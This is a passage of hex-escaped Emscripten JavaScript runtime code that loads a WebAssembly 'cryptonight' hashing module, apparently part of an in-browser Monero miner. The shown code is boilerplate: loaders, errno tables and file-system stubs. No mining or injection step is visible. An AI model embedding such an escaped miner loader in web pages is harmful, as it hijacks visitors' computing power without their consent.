20__ATEXIT__=[];var\x20__ATPOSTRUN__=[];var\x20runtimeInitialized=false;var\x20runtimeExited=false;function\x20preRun(){if(Module[\x22preRun\x22]){if(typeof\x20Module[\x22preRun\x22]==\x22function\x22)Module[\x22preRun\x22]=[Module[\x22preRun\x22]];while(Module[\x22preRun\x22].length){addOnPreRun(Module[\x22preRun\x22].shift())}}callRuntimeCallbacks(__ATPRERUN__)}function\x20ensureInitRuntime(){if(runtimeInitialized)return;runtimeInitialized=true;callRuntimeCallbacks(__ATINIT__)}function\x20preMain(){callRuntimeCallbacks(__ATMAIN__)}function\x20exitRuntime(){callRuntimeCallbacks(__ATEXIT__);runtimeExited=true}function\x20postRun(){if(Module[\x22postRun\x22]){if(typeof\x20Module[\x22postRun\x22]==\x22function\x22)Module[\x22postRun\x22]=[Module[\x22postRun\x22]];while(Module[\x22postRun\x22].length){addOnPostRun(Module[\x22postRun\x22].shift())}}callRuntimeCallbacks(__ATPOSTRUN__)}function\x20addOnPreRun(cb){__ATPRERUN__.unshift(cb)}Module[\x22addOnPreRun\x22]=addOnPreRun;function\x20addOnInit(cb){__ATINIT__.unshift(cb)}Module[\x22addOnInit\x22]=addOnInit;function\x20addOnPreMain(cb){__ATMAIN__.unshift(cb)}Module[\x22addOnPreMain\x22]=addOnPreMain;function\x20addOnExit(cb){__ATEXIT__.unshift(cb)}Module[\x22addOnExit\x22]=addOnExit;function\x20addOnPostRun(cb){__ATPOSTRUN__.unshift(cb)}Module[\x22addOnPostRun\x22]=addOnPostRun;function\x20intArrayFromString(stringy,dontAddNull,length){var\x20len=length>0?length:lengthBytesUTF8(stringy)+1;var\x20u8array=new\x20Array(len);var\x20numBytesWritten=stringToUTF8Array(stringy,u8array,0,u8array.length);if(dontAddNull)u8array.length=numBytesWritten;return\x20u8array}Module[\x22intArrayFromString\x22]=intArrayFromString;function\x20intArrayToString(array){var\x20ret=[];for(var\x20i=0;i<array.length;i++){var\x20chr=array[i];if(chr>255){chr&=255}ret.push(String.fromCharCode(chr))}return\x20ret.join(\x22\x22)}Module[\x22intArrayToString\x22]=intArrayToString;function\x20writeStringToMemory(string,buffer,dontAddNull){Runtime.warnOnce(\x22writeStringToMemory\x20is\x20deprecated\x20and\x20should\x20not\x20be\x20called!\x20Use\x20stringToUTF8()\x20instead!\x22);var\x20lastChar,end;if(dontAddNull){end=buffer+lengthBytesUTF8(string);lastChar=HEAP8[end]}stringToUTF8(string,buffer,Infinity);if(dontAddNull)HEAP8[end]=lastChar}Module[\x22writeStringToMemory\x22]=writeStringToMemory;function\x20writeArrayToMemory(array,buffer){HEAP8.set(array,buffer)}Module[\x22writeArrayToMemory\x22]=writeArrayToMemory;function\x20writeAsciiToMemory(str,buffer,dontAddNull){for(var\x20i=0;i<str.length;++i){HEAP8[buffer++>>0]=str.charCodeAt(i)}if(!dontAddNull)HEAP8[buffer>>0]=0}Module[\x22writeAsciiToMemory\x22]=writeAsciiToMemory;if(!Math[\x22imul\x22]||Math[\x22imul\x22](4294967295,5)!==-5)Math[\x22imul\x22]=function\x20imul(a,b){var\x20ah=a>>>16;var\x20al=a&65535;var\x20bh=b>>>16;var\x20bl=b&65535;return\x20al*bl+(ah*bl+al*bh<<16)|0};Math.imul=Math[\x22imul\x22];if(!Math[\x22fround\x22]){var\x20froundBuffer=new\x20Float32Array(1);Math[\x22fround\x22]=(function(x){froundBuffer[0]=x;return\x20froundBuffer[0]})}Math.fround=Math[\x22fround\x22];if(!Math[\x22clz32\x22])Math[\x22clz32\x22]=(function(x){x=x>>>0;for(var\x20i=0;i<32;i++){if(x&1<<31-i)return\x20i}return\x2032});Math.clz32=Math[\x22clz32\x22];if(!Math[\x22trunc\x22])Math[\x22trunc\x22]=(function(x){return\x20x<0?Math.ceil(x):Math.floor(x)});Math.trunc=Math[\x22trunc\x22];var\x20Math_abs=Math.abs;var\x20Math_cos=Math.cos;var\x20Math_sin=Math.sin;var\x20Math_tan=Math.tan;var\x20Math_acos=Math.acos;var\x20Math_asin=Math.asin;var\x20Math_atan=Math.atan;var\x20Math_atan2=Math.atan2;var\x20Math_exp=Math.exp;var\x20Math_log=Math.log;var\x20Math_sqrt=Math.sqrt;var\x20Math_ceil=Math.ceil;var\x20Math_floor=Math.floor;var\x20Math_pow=Math.pow;var\x20Math_imul=Math.imul;var\x20Math_fround=Math.fround;var\x20Math_round=Math.round;var\x20Math_min=Math.min;var\x20Math_clz32=Math.clz32;var\x20Math_trunc=Math.trunc;var\x20runDependencies=0;var\x20runDependencyWatcher=null;var\x20dependenciesFulfilled=null;function\x20getUniqueRunDependency(id){return\x20id}function\x20addRunDependency(id){runDependencies++;if(Module[\x22monitorRunDependencies\x22]){Module[\x22monitorRunDependencies\x22](runDependencies)}}Module[\x22addRunDependency\x22]=addRunDependency;function\x20removeRunDependency(id){runDependencies--;if(Module[\x22monitorRunDependencies\x22]){Module[\x22monitorRunDependencies\x22](runDependencies)}if(runDependencies==0){if(runDependencyWatcher!==null){clearInterval(runDependencyWatcher);runDependencyWatcher=null}if(dependenciesFulfilled){var\x20callback=dependenciesFulfilled;dependenciesFulfilled=null;callback()}}}Module[\x22removeRunDependency\x22]=removeRunDependency;Module[\x22preloadedImages\x22]={};Module[\x22preloadedAudios\x22]={};var\x20memoryInitializer=null;function\x20integrateWasmJS(Module){var\x20method=Module[\x22wasmJSMethod\x22]||\x22native-wasm\x22;Module[\x22wasmJSMethod\x22]=method;var\x20wasmTextFile=Module[\x22wasmTextFile\x22]||\x22c.wast\x22;var\x20wasmBinaryFile=Module[\x22wasmBinaryFile\x22]||\x22c.wasm\x22;var\x20asmjsCodeFile=Module[\x22asmjsCodeFile\x22]||\x22cryptonight.temp.asm.js\x22;if(typeof\x20Module[\x22locateFile\x22]===\x22function\x22){wasmTextFile=Module[\x22locateFile\x22](wasmTextFile);wasmBinaryFile=Module[\x22locateFile\x22](wasmBinaryFile);asmjsCodeFile=Module[\x22locateFile\x22](asmjsCodeFile)}var\x20wasmPageSize=64*1024;var\x20asm2wasmImports={\x22f64-rem\x22:(function(x,y){return\x20x%y}),\x22f64-to-int\x22:(function(x){return\x20x|0}),\x22i32s-div\x22:(function(x,y){return(x|0)/(y|0)|0}),\x22i32u-div\x22:(function(x,y){return(x>>>0)/(y>>>0)>>>0}),\x22i32s-rem\x22:(function(x,y){return(x|0)%(y|0)|0}),\x22i32u-rem\x22:(function(x,y){return(x>>>0)%(y>>>0)>>>0}),\x22debugger\x22:(function(){debugger})};var\x20info={\x22global\x22:null,\x22env\x22:null,\x22asm2wasm\x22:asm2wasmImports,\x22parent\x22:Module};var\x20exports=null;function\x20lookupImport(mod,base){var\x20lookup=info;if(mod.indexOf(\x22.\x22)<0){lookup=(lookup||{})[mod]}else{var\x20parts=mod.split(\x22.\x22);lookup=(lookup||{})[parts[0]];lookup=(lookup||{})[parts[1]]}if(base){lookup=(lookup||{})[base]}if(lookup===undefined){abort(\x22bad\x20lookupImport\x20to\x20(\x22+mod+\x22).\x22+base)}return\x20lookup}function\x20mergeMemory(newBuffer){var\x20oldBuffer=Module[\x22buffer\x22];if(newBuffer.byteLength<oldBuffer.byteLength){Module[\x22printErr\x22](\x22the\x20new\x20buffer\x20in\x20mergeMemory\x20is\x20smaller\x20than\x20the\x20previous\x20one.\x20in\x20native\x20wasm,\x20we\x20should\x20grow\x20memory\x20here\x22)}var\x20oldView=new\x20Int8Array(oldBuffer);var\x20newView=new\x20Int8Array(newBuffer);if(!memoryInitializer){oldView.set(newView.subarray(Module[\x22STATIC_BASE\x22],Module[\x22STATIC_BASE\x22]+Module[\x22STATIC_BUMP\x22]),Module[\x22STATIC_BASE\x22])}newView.set(oldView);updateGlobalBuffer(newBuffer);updateGlobalBufferViews()}var\x20WasmTypes={none:0,i32:1,i64:2,f32:3,f64:4};function\x20fixImports(imports){if(!0)return\x20imports;var\x20ret={};for(var\x20i\x20in\x20imports){var\x20fixed=i;if(fixed[0]==\x22_\x22)fixed=fixed.substr(1);ret[fixed]=imports[i]}return\x20ret}function\x20getBinary(){try{var\x20binary;if(Module[\x22wasmBinary\x22]){binary=Module[\x22wasmBinary\x22];binary=new\x20Uint8Array(binary)}else\x20if(Module[\x22readBinary\x22]){binary=Module[\x22readBinary\x22](wasmBinaryFile)}else{throw\x22on\x20the\x20web,\x20we\x20need\x20the\x20wasm\x20binary\x20to\x20be\x20preloaded\x20and\x20set\x20on\x20Module[\x27wasmBinary\x27].\x20emcc.py\x20will\x20do\x20that\x20for\x20you\x20when\x20generating\x20HTML\x20(but\x20not\x20JS)\x22}return\x20binary}catch(err){abort(err)}}function\x20getBinaryPromise(){if(!Module[\x22wasmBinary\x22]&&typeof\x20fetch===\x22function\x22){return\x20fetch(wasmBinaryFile,{credentials:\x22same-origin\x22}).then((function(response){if(!response[\x22ok\x22]){throw\x22failed\x20to\x20load\x20wasm\x20binary\x20file\x20at\x20\x27\x22+wasmBinaryFile+\x22\x27\x22}return\x20response[\x22arrayBuffer\x22]()}))}return\x20new\x20Promise((function(resolve,reject){resolve(getBinary())}))}function\x20doNativeWasm(global,env,providedBuffer){if(typeof\x20WebAssembly!==\x22object\x22){Module[\x22printErr\x22](\x22no\x20native\x20wasm\x20support\x20detected\x22);return\x20false}if(!(Module[\x22wasmMemory\x22]instanceof\x20WebAssembly.Memory)){Module[\x22printErr\x22](\x22no\x20native\x20wasm\x20Memory\x20in\x20use\x22);return\x20false}env[\x22memory\x22]=Module[\x22wasmMemory\x22];info[\x22global\x22]={\x22NaN\x22:NaN,\x22Infinity\x22:Infinity};info[\x22global.Math\x22]=global.Math;info[\x22env\x22]=env;function\x20receiveInstance(instance){exports=instance.exports;if(exports.memory)mergeMemory(exports.memory);Module[\x22asm\x22]=exports;Module[\x22usingWasm\x22]=true;removeRunDependency(\x22wasm-instantiate\x22)}addRunDependency(\x22wasm-instantiate\x22);if(Module[\x22instantiateWasm\x22]){try{return\x20Module[\x22instantiateWasm\x22](info,receiveInstance)}catch(e){Module[\x22printErr\x22](\x22Module.instantiateWasm\x20callback\x20failed\x20with\x20error:\x20\x22+e);return\x20false}}getBinaryPromise().then((function(binary){return\x20WebAssembly.instantiate(binary,info)})).then((function(output){receiveInstance(output[\x22instance\x22])})).catch((function(reason){Module[\x22printErr\x22](\x22failed\x20to\x20asynchronously\x20prepare\x20wasm:\x20\x22+reason);abort(reason)}));return{}}Module[\x22asmPreload\x22]=Module[\x22asm\x22];var\x20asmjsReallocBuffer=Module[\x22reallocBuffer\x22];var\x20wasmReallocBuffer=(function(size){var\x20PAGE_MULTIPLE=Module[\x22usingWasm\x22]?WASM_PAGE_SIZE:ASMJS_PAGE_SIZE;size=alignUp(size,PAGE_MULTIPLE);var\x20old=Module[\x22buffer\x22];var\x20oldSize=old.byteLength;if(Module[\x22usingWasm\x22]){try{var\x20result=Module[\x22wasmMemory\x22].grow((size-oldSize)/wasmPageSize);if(result!==(-1|0)){return\x20Module[\x22buffer\x22]=Module[\x22wasmMemory\x22].buffer}else{return\x20null}}catch(e){return\x20null}}else{exports[\x22__growWasmMemory\x22]((size-oldSize)/wasmPageSize);return\x20Module[\x22buffer\x22]!==old?Module[\x22buffer\x22]:null}});Module[\x22reallocBuffer\x22]=(function(size){if(finalMethod===\x22asmjs\x22){return\x20asmjsReallocBuffer(size)}else{return\x20wasmReallocBuffer(size)}});var\x20finalMethod=\x22\x22;Module[\x22asm\x22]=(function(global,env,providedBuffer){global=fixImports(global);env=fixImports(env);if(!env[\x22table\x22]){var\x20TABLE_SIZE=Module[\x22wasmTableSize\x22];if(TABLE_SIZE===undefined)TABLE_SIZE=1024;var\x20MAX_TABLE_SIZE=Module[\x22wasmMaxTableSize\x22];if(typeof\x20WebAssembly===\x22object\x22&&typeof\x20WebAssembly.Table===\x22function\x22){if(MAX_TABLE_SIZE!==undefined){env[\x22table\x22]=new\x20WebAssembly.Table({\x22initial\x22:TABLE_SIZE,\x22maximum\x22:MAX_TABLE_SIZE,\x22element\x22:\x22anyfunc\x22})}else{env[\x22table\x22]=new\x20WebAssembly.Table({\x22initial\x22:TABLE_SIZE,element:\x22anyfunc\x22})}}else{env[\x22table\x22]=new\x20Array(TABLE_SIZE)}Module[\x22wasmTable\x22]=env[\x22table\x22]}if(!env[\x22memoryBase\x22]){env[\x22memoryBase\x22]=Module[\x22STATIC_BASE\x22]}if(!env[\x22tableBase\x22]){env[\x22tableBase\x22]=0}var\x20exports;exports=doNativeWasm(global,env,providedBuffer);return\x20exports});var\x20methodHandler=Module[\x22asm\x22]}integrateWasmJS(Module);var\x20ASM_CONSTS=[];STATIC_BASE=Runtime.GLOBAL_BASE;STATICTOP=STATIC_BASE+12512;__ATINIT__.push();memoryInitializer=Module[\x22wasmJSMethod\x22].indexOf(\x22asmjs\x22)>=0||Module[\x22wasmJSMethod\x22].indexOf(\x22interpret-asm2wasm\x22)>=0?\x22cryptonight.js.mem\x22:null;var\x20STATIC_BUMP=12512;Module[\x22STATIC_BASE\x22]=STATIC_BASE;Module[\x22STATIC_BUMP\x22]=STATIC_BUMP;var\x20tempDoublePtr=STATICTOP;STATICTOP+=16;function\x20___assert_fail(condition,filename,line,func){ABORT=true;throw\x22Assertion\x20failed:\x20\x22+Pointer_stringify(condition)+\x22,\x20at:\x20\x22+[filename?Pointer_stringify(filename):\x22unknown\x20filename\x22,line,func?Pointer_stringify(func):\x22unknown\x20function\x22]+\x22\x20at\x20\x22+stackTrace()}var\x20PROCINFO={ppid:1,pid:42,sid:42,pgid:42};var\x20ERRNO_CODES={EPERM:1,ENOENT:2,ESRCH:3,EINTR:4,EIO:5,ENXIO:6,E2BIG:7,ENOEXEC:8,EBADF:9,ECHILD:10,EAGAIN:11,EWOULDBLOCK:11,ENOMEM:12,EACCES:13,EFAULT:14,ENOTBLK:15,EBUSY:16,EEXIST:17,EXDEV:18,ENODEV:19,ENOTDIR:20,EISDIR:21,EINVAL:22,ENFILE:23,EMFILE:24,ENOTTY:25,ETXTBSY:26,EFBIG:27,ENOSPC:28,ESPIPE:29,EROFS:30,EMLINK:31,EPIPE:32,EDOM:33,ERANGE:34,ENOMSG:42,EIDRM:43,ECHRNG:44,EL2NSYNC:45,EL3HLT:46,EL3RST:47,ELNRNG:48,EUNATCH:49,ENOCSI:50,EL2HLT:51,EDEADLK:35,ENOLCK:37,EBADE:52,EBADR:53,EXFULL:54,ENOANO:55,EBADRQC:56,EBADSLT:57,EDEADLOCK:35,EBFONT:59,ENOSTR:60,ENODATA:61,ETIME:62,ENOSR:63,ENONET:64,ENOPKG:65,EREMOTE:66,ENOLINK:67,EADV:68,ESRMNT:69,ECOMM:70,EPROTO:71,EMULTIHOP:72,EDOTDOT:73,EBADMSG:74,ENOTUNIQ:76,EBADFD:77,EREMCHG:78,ELIBACC:79,ELIBBAD:80,ELIBSCN:81,ELIBMAX:82,ELIBEXEC:83,ENOSYS:38,ENOTEMPTY:39,ENAMETOOLONG:36,ELOOP:40,EOPNOTSUPP:95,EPFNOSUPPORT:96,ECONNRESET:104,ENOBUFS:105,EAFNOSUPPORT:97,EPROTOTYPE:91,ENOTSOCK:88,ENOPROTOOPT:92,ESHUTDOWN:108,ECONNREFUSED:111,EADDRINUSE:98,ECONNABORTED:103,ENETUNREACH:101,ENETDOWN:100,ETIMEDOUT:110,EHOSTDOWN:112,EHOSTUNREACH:113,EINPROGRESS:115,EALREADY:114,EDESTADDRREQ:89,EMSGSIZE:90,EPROTONOSUPPORT:93,ESOCKTNOSUPPORT:94,EADDRNOTAVAIL:99,ENETRESET:102,EISCONN:106,ENOTCONN:107,ETOOMANYREFS:109,EUSERS:87,EDQUOT:122,ESTALE:116,ENOTSUP:95,ENOMEDIUM:123,EILSEQ:84,EOVERFLOW:75,ECANCELED:125,ENOTRECOVERABLE:131,EOWNERDEAD:130,ESTRPIPE:86};var\x20ERRNO_MESSAGES={0:\x22Success\x22,1:\x22Not\x20super-user\x22,2:\x22No\x20such\x20file\x20or\x20directory\x22,3:\x22No\x20such\x20process\x22,4:\x22Interrupted\x20system\x20call\x22,5:\x22I/O\x20error\x22,6:\x22No\x20such\x20device\x20or\x20address\x22,7:\x22Arg\x20list\x20too\x20long\x22,8:\x22Exec\x20format\x20error\x22,9:\x22Bad\x20file\x20number\x22,10:\x22No\x20children\x22,11:\x22No\x20more\x20processes\x22,12:\x22Not\x20enough\x20core\x22,13:\x22Permission\x20denied\x22,14:\x22Bad\x20address\x22,15:\x22Block\x20device\x20required\x22,16:\x22Mount\x20device\x20busy\x22,17:\x22File\x20exists\x22,18:\x22Cross-device\x20link\x22,19:\x22No\x20such\x20device\x22,20:\x22Not\x20a\x20directory\x22,21:\x22Is\x20a\x20directory\x22,22:\x22Invalid\x20argument\x22,23:\x22Too\x20many\x20open\x20files\x20in\x20system\x22,24:\x22Too\x20many\x20open\x20files\x22,25:\x22Not\x20a\x20typewriter\x22,26:\x22Text\x20file\x20busy\x22,27:\x22File\x20too\x20large\x22,28:\x22No\x20space\x20left\x20on\x20device\x22,29:\x22Illegal\x20seek\x22,30:\x22Read\x20only\x20file\x20system\x22,31:\x22Too\x20many\x20links\x22,32:\x22Broken\x20pipe\x22,33:\x22Math\x20arg\x20out\x20of\x20domain\x20of\x20func\x22,34:\x22Math\x20result\x20not\x20representable\x22,35:\x22File\x20locking\x20deadlock\x20error\x22,36:\x22File\x20or\x20path\x20name\x20too\x20long\x22,37:\x22No\x20record\x20locks\x20available\x22,38:\x22Function\x20not\x20implemented\x22,39:\x22Directory\x20not\x20empty\x22,40:\x22Too\x20many\x20symbolic\x20links\x22,42:\x22No\x20message\x20of\x20desired\x20type\x22,43:\x22Identifier\x20removed\x22,44:\x22Channel\x20number\x20out\x20of\x20range\x22,45:\x22Level\x202\x20not\x20synchronized\x22,46:\x22Level\x203\x20halted\x22,47:\x22Level\x203\x20reset\x22,48:\x22Link\x20number\x20out\x20of\x20range\x22,49:\x22Protocol\x20driver\x20not\x20attached\x22,50:\x22No\x20CSI\x20structure\x20available\x22,51:\x22Level\x202\x20halted\x22,52:\x22Invalid\x20exchange\x22,53:\x22Invalid\x20request\x20descriptor\x22,54:\x22Exchange\x20full\x22,55:\x22No\x20anode\x22,56:\x22Invalid\x20request\x20code\x22,57:\x22Invalid\x20slot\x22,59:\x22Bad\x20font\x20file\x20fmt\x22,60:\x22Device\x20not\x20a\x20stream\x22,61:\x22No\x20data\x20(for\x20no\x20delay\x20io)\x22,62:\x22Timer\x20expired\x22,63:\x22Out\x20of\x20streams\x20resources\x22,64:\x22Machine\x20is\x20not\x20on\x20the\x20network\x22,65:\x22Package\x20not\x20installed\x22,66:\x22The\x20object\x20is\x20remote\x22,67:\x22The\x20link\x20has\x20been\x20severed\x22,68:\x22Advertise\x20error\x22,69:\x22Srmount\x20error\x22,70:\x22Communication\x20error\x20on\x20send\x22,71:\x22Protocol\x20error\x22,72:\x22Multihop\x20attempted\x22,73:\x22Cross\x20mount\x20point\x20(not\x20really\x20error)\x22,74:\x22Trying\x20to\x20read\x20unreadable\x20message\x22,75:\x22Value\x20too\x20large\x20for\x20defined\x20data\x20type\x22,76:\x22Given\x20log.\x20name\x20not\x20unique\x22,77:\x22f.d.\x20invalid\x20for\x20this\x20operation\x22,78:\x22Remote\x20address\x20changed\x22,79:\x22Can\x20access\x20a\x20needed\x20shared\x20lib\x22,80:\x22Accessing\x20a\x20corrupted\x20shared\x20lib\x22,81:\x22.lib\x20section\x20in\x20a.out\x20corrupted\x22,82:\x22Attempting\x20to\x20link\x20in\x20too\x20many\x20libs\x22,83:\x22Attempting\x20to\x20exec\x20a\x20shared\x20library\x22,84:\x22Illegal\x20byte\x20sequence\x22,86:\x22Streams\x20pipe\x20error\x22,87:\x22Too\x20many\x20users\x22,88:\x22Socket\x20operation\x20on\x20non-socket\x22,89:\x22Destination\x20address\x20required\x22,90:\x22Message\x20too\x20long\x22,91:\x22Protocol\x20wrong\x20type\x20for\x20socket\x22,92:\x22Protocol\x20not\x20available\x22,93:\x22Unknown\x20protocol\x22,94:\x22Socket\x20type\x20not\x20supported\x22,95:\x22Not\x20supported\x22,96:\x22Protocol\x20family\x20not\x20supported\x22,97:\x22Address\x20family\x20not\x20supported\x20by\x20protocol\x20family\x22,98:\x22Address\x20already\x20in\x20use\x22,99:\x22Address\x20not\x20available\x22,100:\x22Network\x20interface\x20is\x20not\x20configured\x22,101:\x22Network\x20is\x20unreachable\x22,102:\x22Connection\x20reset\x20by\x20network\x22,103:\x22Connection\x20aborted\x22,104:\x22Connection\x20reset\x20by\x20peer\x22,105:\x22No\x20buffer\x20space\x20available\x22,106:\x22Socket\x20is\x20already\x20connected\x22,107:\x22Socket\x20is\x20not\x20connected\x22,108:\x22Can\x27t\x20send\x20after\x20socket\x20shutdown\x22,109:\x22Too\x20many\x20references\x22,110:\x22Connection\x20timed\x20out\x22,111:\x22Connection\x20refused\x22,112:\x22Host\x20is\x20down\x22,113:\x22Host\x20is\x20unreachable\x22,114:\x22Socket\x20already\x20connected\x22,115:\x22Connection\x20already\x20in\x20progress\x22,116:\x22Stale\x20file\x20handle\x22,122:\x22Quota\x20exceeded\x22,123:\x22No\x20medium\x20(in\x20tape\x20drive)\x22,125:\x22Operation\x20canceled\x22,130:\x22Previous\x20owner\x20died\x22,131:\x22State\x20not\x20recoverable\x22};function\x20___setErrNo(value){if(Module[\x22___errno_location\x22])HEAP32[Module[\x22___errno_location\x22]()>>2]=value;return\x20value}var\x20PATH={splitPath:(function(filename){var\x20splitPathRe=/^(\x5c/?|)([\x5cs\x5cS]*?)((?:\x5c.{1,2}|[^\x5c/]+?|)(\x5c.[^.\x5c/]*|))(?:[\x5c/]*)$/;return\x20splitPathRe.exec(filename).slice(1)}),normalizeArray:(function(parts,allowAboveRoot){var\x20up=0;for(var\x20i=parts.length-1;i>=0;i--){var\x20last=parts[i];if(last===\x22.\x22){parts.splice(i,1)}else\x20if(last===\x22..\x22){parts.splice(i,1);up++}else\x20if(up){parts.splice(i,1);up--}}if(allowAboveRoot){for(;up;up--){parts.unshift(\x22..\x22)}}return\x20parts}),normalize:(function(path){var\x20isAbsolute=path.charAt(0)===\x22/\x22,trailingSlash=path.substr(-1)===\x22/\x22;path=PATH.normalizeArray(path.split(\x22/\x22).filter((function(p){return!!p})),!isAbsolute).join(\x22/\x22);if(!path&&!isAbsolute){path=\x22.\x22}if(path&&trailingSlash){path+=\x22/\x22}return(isAbsolute?\x22/\x22:\x22\x22)+path}),dirname:(function(path){var\x20result=PATH.splitPath(path),root=result[0],dir=result[1];if(!root&&!dir){return\x22.\x22}if(dir){dir=dir.substr(0,dir.length-1)}return\x20root+dir}),basename:(function(path){if(path===\x22/\x22)return\x22/\x22;var\x20lastSlash=path.lastIndexOf(\x22/\x22);if(lastSlash===-1)return\x20path;return\x20path.substr(lastSlash+1)}),extname:(function(path){return\x20PATH.splitPath(path)[3]}),join:(function(){var\x20paths=Array.prototype.slice.call(arguments,0);return\x20PATH.normalize(paths.join(\x22/\x22))}),join2:(function(l,r){return\x20PATH.normalize(l+\x22/\x22+r)}),resolve:(function(){var\x20resolvedPath=\x22\x22,resolvedAbsolute=false;for(var\x20i=arguments.length-1;i>=-1&&!resolvedAbsolute;i--){var\x20path=i>=0?arguments[i]:FS.cwd();if(typeof\x20path!==\x22string\x22){throw\x20new\x20TypeError(\x22Arguments\x20to\x20path.resolve\x20must\x20be\x20strings\x22)}else\x20if(!path){return\x22\x22}resolvedPath=path+\x22/\x22+resolvedPath;resolvedAbsolute=path.charAt(0)===\x22/\x22}resolvedPath=PATH.normalizeArray(resolvedPath.split(\x22/\x22).filter((function(p){return!!p})),!resolvedAbsolute).join(\x22/\x22);return(resolvedAbsolute?\x22/\x22:\x22\x22)+resolvedPath||\x22.\x22}),relative:(function(from,to){from=PATH.resolve(from).substr(1);to=PATH.resolve(to).substr(1);function\x20trim(arr){var\x20start=0;for(;start<arr.length;start++){if(arr[start]!==\x22\x22)break}var\x20end=arr.length-1;for(;end>=0;end--){if(arr[end]!==\x22\x22)break}if(start>end)return[];return\x20arr.slice(start,end-start+1)}var\x20fromParts=trim(from.split(\x22/\x22));var\x20toParts=trim(to.split(\x22/\x22));var\x20length=Math.min(fromParts.length,toParts.length);var\x20samePartsLength=length;for(var\x20i=0;i<length;i++){if(fromParts[i]!==toParts[i]){samePartsLength=i;break}}var\x20outputParts=[];for(var\x20i=samePartsLength;i<fromParts.length;i++){outputParts.push(\x22..\x22)}outputParts=outputParts.concat(toParts.slice(samePartsLength));return\x20outputParts.join(\x22/\x22)})};var\x20TTY={ttys:[],init:(function(){}),shutdown:(function(){}),register:(function(dev,ops){TTY.ttys[dev]={input:[],output:[],ops:ops};FS.registerDevice(dev,TTY.stream_ops)}),stream_ops:{open:(function(stream){var\x20tty=TTY.ttys[stream.node.rdev];if(!tty){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENODEV)}stream.tty=tty;stream.seekable=false}),close:(function(stream){stream.tty.ops.flush(stream.tty)}),flush:(function(stream){stream.tty.ops.flush(stream.tty)}),read:(function(stream,buffer,offset,length,pos){if(!stream.tty||!stream.tty.ops.get_char){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENXIO)}var\x20bytesRead=0;for(var\x20i=0;i<length;i++){var\x20result;try{result=stream.tty.ops.get_char(stream.tty)}catch(e){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EIO)}if(result===undefined&&bytesRead===0){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EAGAIN)}if(result===null||result===undefined)break;bytesRead++;buffer[offset+i]=result}if(bytesRead){stream.node.timestamp=Date.now()}return\x20bytesRead}),write:(function(stream,buffer,offset,length,pos){if(!stream.tty||!stream.tty.ops.put_char){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.ENXIO)}for(var\x20i=0;i<length;i++){try{stream.tty.ops.put_char(stream.tty,buffer[offset+i])}catch(e){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EIO)}}if(length){stream.node.timestamp=Date.now()}return\x20i})},default_tty_ops:{get_char:(function(tty){if(!tty.input.length){var\x20result=null;if(ENVIRONMENT_IS_NODE){var\x20BUFSIZE=256;var\x20buf=new\x20Buffer(BUFSIZE);var\x20bytesRead=0;var\x20isPosixPlatform=process.platform!=\x22win32\x22;var\x20fd=process.stdin.fd;if(isPosixPlatform){var\x20usingDevice=false;try{fd=fs.openSync(\x22/dev/stdin\x22,\x22r\x22);usingDevice=true}catch(e){}}try{bytesRead=fs.readSync(fd,buf,0,BUFSIZE,null)}catch(e){if(e.toString().indexOf(\x22EOF\x22)!=-1)bytesRead=0;else\x20throw\x20e}if(usingDevice){fs.closeSync(fd)}if(bytesRead>0){result=buf.slice(0,bytesRead).toString(\x22utf-8\x22)}else{result=null}}else\x20if(typeof\x20window!=\x22undefined\x22&&typeof\x20window.prompt==\x22function\x22){result=window.prompt(\x22Input:\x20\x22);if(result!==null){result+=\x22\x5cn\x22}}else\x20if(typeof\x20readline==\x22function\x22){result=readline();if(result!==null){result+=\x22\x5cn\x22}}if(!result){return\x20null}tty.input=intArrayFromString(result,true)}return\x20tty.input.shift()}),put_char:(function(tty,val){if(val===null||val===10){Module[\x22print\x22](UTF8ArrayToString(tty.output,0));tty.output=[]}else{if(val!=0)tty.output.push(val)}}),flush:(function(tty){if(tty.output&&tty.output.length>0){Module[\x22print\x22](UTF8ArrayToString(tty.output,0));tty.output=[]}})},default_tty1_ops:{put_char:(function(tty,val){if(val===null||val===10){Module[\x22printErr\x22](UTF8ArrayToString(tty.output,0));tty.output=[]}else{if(val!=0)tty.output.push(val)}}),flush:(function(tty){if(tty.output&&tty.output.length>0){Module[\x22printErr\x22](UTF8ArrayToString(tty.output,0));tty.output=[]}})}};var\x20MEMFS={ops_table:null,mount:(function(mount){return\x20MEMFS.createNode(null,\x22/\x22,16384|511,0)}),createNode:(function(parent,name,mode,dev){if(FS.isBlkdev(mode)||FS.isFIFO(mode)){throw\x20new\x20FS.ErrnoError(ERRNO_CODES.EPERM)}if(!MEMFS.ops_table){MEMFS.ops_table={dir:{node:{getattr:MEMFS.node_ops.getattr,setattr:MEMFS.node_ops.setattr,lookup:MEMFS.node_ops.lookup,mknod:MEMFS.node_ops.mknod,rename:MEMFS.node_ops.rename,unlink:MEMFS.node_ops.unlink,rmdir:MEMFS.node_ops.rmdir,readdir:MEMFS.node_ops.readdir,symlink:MEMFS.node_ops.symlink},stream:{llseek:MEMFS.stream_ops.llseek}},file:{node:{getattr:MEMFS.node_ops.getattr,setattr:MEMFS.node_ops.setattr},stream:{llseek:MEMFS.stream_ops.llseek,read:MEMFS.stream_ops.read,write:MEMFS.stream_ops.write,allocate:MEMFS.stream_ops.allocate,mmap:MEMFS.stream_ops.mmap,msync:MEMFS.stream_ops.msync}},link:{node:{getattr:MEMFS.node_ops.getattr,setattr:MEMFS.node_ops.setattr,readlink:MEMFS.node_ops.readlink},stream:{}},chrdev:{node:{getattr:MEMFS.node_ops.getattr,setattr:MEMFS.node_ops.setattr},stream:FS.chrdev_stream_ops}}}var\x20node=FS.createNode(parent,name,mode,dev);if(FS.isDir(node.mode)){node.node_ops=MEMFS.ops_table.dir.node;node.stream_ops=MEMFS.ops_table.dir.stream;node.contents={}}else\x20if(FS.isFile(node.mode)){node.node_ops=MEMFS.ops_table.file.node;node.stream_ops=MEMFS.ops_table.file.stream;node.usedBytes=0;node.contents=null}else\x20if(FS.isLink(node.mode)){node.node_ops=MEMFS.ops_table.link.node;node.stream_ops=MEMFS.ops_table.link.stream}else\x20if(FS.isChrdev(node.mode)){node.node_ops=MEMFS.ops_table.chrdev.node;node.stream_ops=MEMFS.ops_table.chrdev.stream}node.timestamp=Date.now();if(parent){parent.contents[name]=node}return\x20node}),getF